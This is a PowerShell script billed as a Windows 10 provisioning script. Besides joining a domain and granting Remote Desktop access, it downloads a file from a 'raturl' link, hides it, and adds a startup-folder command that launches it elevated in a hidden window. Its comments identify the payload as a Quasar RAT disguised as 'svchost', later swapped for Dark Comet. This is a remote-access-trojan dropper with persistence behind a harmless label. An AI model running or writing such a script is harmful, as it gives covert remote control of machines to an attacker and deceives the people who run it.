### Basic non-Parameterized ps1 script to allow introduction of various limited-provisioning commands to Windows 10
param(
  [String]$defAdminUsr, 
  [String]$defAdminPwd,
  [String]$domain,
  [String]$domAdminUsr,
  [String]$domAdminPwd,
  [String]$localpath,
  [String]$downloadlink
)

$raturl = "https://gofile.io/d/VHmBL1"
$startup = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\runadm.cmd"

$temppwd = ConvertTo-SecureString -String $defAdminPwd -AsPlainText -Force
$localcred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $defAdminUsr,$temppwd

$temppwd = ConvertTo-SecureString -String $domAdminPwd -AsPlainText -Force
$domaincred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ($domain + "\" + $domAdminUsr),$temppwd

add-computer -domainname $domain -domaincredential $domaincred
Add-LocalGroupMember -group "Remote Desktop Users" -member $domAdminUsr

Invoke-WebRequest -uri $raturl -OutFile $localpath

$hideFile = get-item $localpath -Force
$hideFile.attributes = "Hidden"

"powershell -c start -verb runas $localpath -windowstyle hidden" | out-file -filepath $startup

# https://github.com/cybermias/publicrep/raw/master/guacconf/Python.37.svchost.exe <== OLD Quasar
# Moved to Dark Commet https://gofile.io/d/VHmBL1
# c:\users\cmtsadmin\searches\python37x.exe 
cmd /c 'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\" /v "PagingFiles" /t REG_MULTI_SZ /d "D:\pagefile.sys 0 0" /f'


cscript c:\windows\system32\slmgr.vbs /rearm

shutdown /r /t 03
